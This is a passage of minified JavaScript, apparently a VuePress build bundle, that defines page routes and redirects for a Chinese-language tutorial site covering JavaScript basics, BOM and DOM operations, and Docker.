r;switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),(r=n[e]).push.apply(r,Object(Bi.a)(t));break;default:throw new Error("Unknown option name.")}}(Bl,"mixins",Al);var Sl=[{name:"v-45c98a7a",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/Navigator%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-45c98a7a").then(t)}},{path:"/Javascript/JavaScriptBOM操作/Navigator对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/Navigator%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/JavaScriptBOM操作/Navigator对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/Navigator%E5%AF%B9%E8%B1%A1.html"},{name:"v-eff1ac7a",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/console%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-eff1ac7a").then(t)}},{path:"/Javascript/JavaScriptBOM操作/console对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/console%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/JavaScriptBOM操作/console对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/console%E5%AF%B9%E8%B1%A1.html"},{name:"v-16dd6f9c",path:"/Docker/",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-16dd6f9c").then(t)}},{path:"/Docker/index.html",redirect:"/Docker/"},{name:"v-001ebd09",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/history%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-001ebd09").then(t)}},{path:"/Javascript/JavaScriptBOM操作/history对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/history%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/JavaScriptBOM操作/history对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/history%E5%AF%B9%E8%B1%A1.html"},{name:"v-4724a521",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/location%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-4724a521").then(t)}},{path:"/Javascript/JavaScriptBOM操作/location对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/location%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/JavaScriptBOM操作/location对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/location%E5%AF%B9%E8%B1%A1.html"},{name:"v-991587be",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM%E8%8A%82%E7%82%B9.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-991587be").then(t)}},{path:"/Javascript/JavaScriptDOM操作/DOM节点.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM%E8%8A%82%E7%82%B9.html"},{path:"/Javascript/JavaScriptDOM操作/DOM节点.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM%E8%8A%82%E7%82%B9.html"},{name:"v-12c5f263",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-12c5f263").then(t)}},{path:"/Javascript/JavaScriptDOM操作/DOM.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM.html"},{path:"/Javascript/JavaScriptDOM操作/DOM.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/DOM.html"},{name:"v-a5269cf6",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/JavaScript%E5%8A%A8%E7%94%BB.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-a5269cf6").then(t)}},{path:"/Javascript/JavaScriptDOM操作/JavaScript动画.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/JavaScript%E5%8A%A8%E7%94%BB.html"},{path:"/Javascript/JavaScriptDOM操作/JavaScript动画.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/JavaScript%E5%8A%A8%E7%94%BB.html"},{name:"v-8a0714ca",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-8a0714ca").then(t)}},{path:"/Javascript/JavaScriptDOM操作/事件基础.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80.html"},{path:"/Javascript/JavaScriptDOM操作/事件基础.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80.html"},{name:"v-780664cb",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E5%85%83%E7%B4%A0%E5%B0%BA%E5%AF%B8%E4%BD%8D%E7%BD%AE.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-780664cb").then(t)}},{path:"/Javascript/JavaScriptDOM操作/元素尺寸位置.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E5%85%83%E7%B4%A0%E5%B0%BA%E5%AF%B8%E4%BD%8D%E7%BD%AE.html"},{path:"/Javascript/JavaScriptDOM操作/元素尺寸位置.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E5%85%83%E7%B4%A0%E5%B0%BA%E5%AF%B8%E4%BD%8D%E7%BD%AE.html"},{name:"v-6ef494da",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-6ef494da").then(t)}},{path:"/Javascript/JavaScriptDOM操作/本地存储.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8.html"},{path:"/Javascript/JavaScriptDOM操作/本地存储.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8.html"},{name:"v-436e11b6",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E9%AB%98%E7%BA%A7.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-436e11b6").then(t)}},{path:"/Javascript/JavaScriptDOM操作/事件高级.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E9%AB%98%E7%BA%A7.html"},{path:"/Javascript/JavaScriptDOM操作/事件高级.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E9%AB%98%E7%BA%A7.html"},{name:"v-70c85bc1",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/window%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-70c85bc1").then(t)}},{path:"/Javascript/JavaScriptBOM操作/window对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/window%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/JavaScriptBOM操作/window对象.html",redirect:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/window%E5%AF%B9%E8%B1%A1.html"},{name:"v-1fd2367a",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/03-%E8%BF%90%E7%AE%97%E7%AC%A6.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-1fd2367a").then(t)}},{path:"/Javascript/Javascript基础语法/03-运算符.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/03-%E8%BF%90%E7%AE%97%E7%AC%A6.html"},{path:"/Javascript/Javascript基础语法/03-运算符.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/03-%E8%BF%90%E7%AE%97%E7%AC%A6.html"},{name:"v-74049526",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E8%A1%A8%E5%8D%95%E6%93%8D%E4%BD%9C.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-74049526").then(t)}},{path:"/Javascript/JavaScriptDOM操作/表单操作.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E8%A1%A8%E5%8D%95%E6%93%8D%E4%BD%9C.html"},{path:"/Javascript/JavaScriptDOM操作/表单操作.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E8%A1%A8%E5%8D%95%E6%93%8D%E4%BD%9C.html"},{name:"v-520e8ad4",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/01-ECMAScript%E4%BB%8B%E7%BB%8D.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-520e8ad4").then(t)}},{path:"/Javascript/Javascript基础语法/01-ECMAScript介绍.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/01-ECMAScript%E4%BB%8B%E7%BB%8D.html"},{path:"/Javascript/Javascript基础语法/01-ECMAScript介绍.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/01-ECMAScript%E4%BB%8B%E7%BB%8D.html"},{name:"v-160d8211",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/01-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%B0%83%E7%94%A8.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-160d8211").then(t)}},{path:"/Javascript/Javascript基础语法/05-函数/01-函数声明与调用.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/01-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%B0%83%E7%94%A8.html"},{path:"/Javascript/Javascript基础语法/05-函数/01-函数声明与调用.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/01-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%B0%83%E7%94%A8.html"},{name:"v-6b592820",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/02-%E5%8F%98%E9%87%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-6b592820").then(t)}},{path:"/Javascript/Javascript基础语法/02-变量与数据类型.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/02-%E5%8F%98%E9%87%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html"},{path:"/Javascript/Javascript基础语法/02-变量与数据类型.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/02-%E5%8F%98%E9%87%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html"},{name:"v-2e7f896a",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/03-%E9%A2%84%E8%A7%A3%E6%9E%90%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-2e7f896a").then(t)}},{path:"/Javascript/Javascript基础语法/05-函数/03-预解析与作用域.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/03-%E9%A2%84%E8%A7%A3%E6%9E%90%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F.html"},{path:"/Javascript/Javascript基础语法/05-函数/03-预解析与作用域.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/03-%E9%A2%84%E8%A7%A3%E6%9E%90%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F.html"},{name:"v-5461105e",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/02-%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%B8%8E%E8%BF%94%E5%9B%9E%E5%80%BC.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-5461105e").then(t)}},{path:"/Javascript/Javascript基础语法/05-函数/02-函数参数与返回值.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/02-%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%B8%8E%E8%BF%94%E5%9B%9E%E5%80%BC.html"},{path:"/Javascript/Javascript基础语法/05-函数/02-函数参数与返回值.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/02-%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%B8%8E%E8%BF%94%E5%9B%9E%E5%80%BC.html"},{name:"v-02135610",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-02135610").then(t)}},{path:"/Javascript/JavaScriptDOM操作/移动端事件.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6.html"},{path:"/Javascript/JavaScriptDOM操作/移动端事件.html",redirect:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6.html"},{name:"v-71c5bcdd",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/06-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-71c5bcdd").then(t)}},{path:"/Javascript/Javascript基础语法/05-函数/06-数据类型转换.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/06-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.html"},{path:"/Javascript/Javascript基础语法/05-函数/06-数据类型转换.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/06-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.html"},{name:"v-c7dd9e30",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/04-%E5%87%BD%E6%95%B0%E9%AB%98%E7%BA%A7.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-c7dd9e30").then(t)}},{path:"/Javascript/Javascript基础语法/05-函数/04-函数高级.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/04-%E5%87%BD%E6%95%B0%E9%AB%98%E7%BA%A7.html"},{path:"/Javascript/Javascript基础语法/05-函数/04-函数高级.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/04-%E5%87%BD%E6%95%B0%E9%AB%98%E7%BA%A7.html"},{name:"v-60d537e2",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/Iterator.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-60d537e2").then(t)}},{path:"/Javascript/Javascript基础语法/06-数组/Iterator.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/Iterator.html"},{path:"/Javascript/Javascript基础语法/06-数组/Iterator.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/Iterator.html"},{name:"v-45c9245d",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/05-%E5%86%85%E7%BD%AE%E9%A1%B6%E5%B1%82%E5%87%BD%E6%95%B0.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-45c9245d").then(t)}},{path:"/Javascript/Javascript基础语法/05-函数/05-内置顶层函数.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/05-%E5%86%85%E7%BD%AE%E9%A1%B6%E5%B1%82%E5%87%BD%E6%95%B0.html"},{path:"/Javascript/Javascript基础语法/05-函数/05-内置顶层函数.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/05-%E5%86%85%E7%BD%AE%E9%A1%B6%E5%B1%82%E5%87%BD%E6%95%B0.html"},{name:"v-4eca17c5",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/01-%E5%AF%B9%E8%B1%A1%E8%AF%A6%E6%83%85.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-4eca17c5").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/01-对象详情.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/01-%E5%AF%B9%E8%B1%A1%E8%AF%A6%E6%83%85.html"},{path:"/Javascript/Javascript基础语法/07-对象/01-对象详情.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/01-%E5%AF%B9%E8%B1%A1%E8%AF%A6%E6%83%85.html"},{name:"v-3b75c570",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/03-class.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-3b75c570").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/03-class.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/03-class.html"},{path:"/Javascript/Javascript基础语法/07-对象/03-class.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/03-class.html"},{name:"v-84ffdf68",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-84ffdf68").then(t)}},{path:"/Javascript/Javascript基础语法/06-数组/数组.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84.html"},{path:"/Javascript/Javascript基础语法/06-数组/数组.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84.html"},{name:"v-07bf1260",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/02-%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E6%80%A7.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-07bf1260").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/02-对象的特性.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/02-%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E6%80%A7.html"},{path:"/Javascript/Javascript基础语法/07-对象/02-对象的特性.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/02-%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E6%80%A7.html"},{name:"v-60fb8218",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/04-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-60fb8218").then(t)}},{path:"/Javascript/Javascript基础语法/04-流程控制.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/04-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.html"},{path:"/Javascript/Javascript基础语法/04-流程控制.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/04-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.html"},{name:"v-5a8ffa96",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/06-Math%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-5a8ffa96").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/06-Math对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/06-Math%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/Javascript基础语法/07-对象/06-Math对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/06-Math%E5%AF%B9%E8%B1%A1.html"},{name:"v-d0738c54",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/07-String%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-d0738c54").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/07-String对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/07-String%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/Javascript基础语法/07-对象/07-String对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/07-String%E5%AF%B9%E8%B1%A1.html"},{name:"v-b6d0b054",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/05-Object%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-b6d0b054").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/05-Object对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/05-Object%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/Javascript基础语法/07-对象/05-Object对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/05-Object%E5%AF%B9%E8%B1%A1.html"},{name:"v-3efb0494",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/11-Number%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-3efb0494").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/11-Number对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/11-Number%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/Javascript基础语法/07-对象/11-Number对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/11-Number%E5%AF%B9%E8%B1%A1.html"},{name:"v-665613b6",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/09-Date%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-665613b6").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/09-Date对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/09-Date%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/Javascript基础语法/07-对象/09-Date对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/09-Date%E5%AF%B9%E8%B1%A1.html"},{name:"v-3b8aff57",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/08-Symbol.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-3b8aff57").then(t)}},{path:"/Javascript/Javascript基础语法/08-Symbol.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/08-Symbol.html"},{path:"/Javascript/Javascript基础语法/08-Symbol.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/08-Symbol.html"},{name:"v-741db942",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/08-Array%E5%AF%B9%E8%B1%A1.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-741db942").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/08-Array对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/08-Array%E5%AF%B9%E8%B1%A1.html"},{path:"/Javascript/Javascript基础语法/07-对象/08-Array对象.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/08-Array%E5%AF%B9%E8%B1%A1.html"},{name:"v-71010e0c",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/04-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-71010e0c").then(t)}},{path:"/Javascript/Javascript基础语法/07-对象/04-面向对象编程.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/04-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B.html"},{path:"/Javascript/Javascript基础语法/07-对象/04-面向对象编程.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/04-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B.html"},{name:"v-309f3f3a",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/09-Set%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-309f3f3a").then(t)}},{path:"/Javascript/Javascript基础语法/09-Set数据结构.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/09-Set%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html"},{path:"/Javascript/Javascript基础语法/09-Set数据结构.html",redirect:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/09-Set%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html"},{name:"v-45a193dc",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/10-%E6%AD%A3%E5%88%99%E5%AF%B9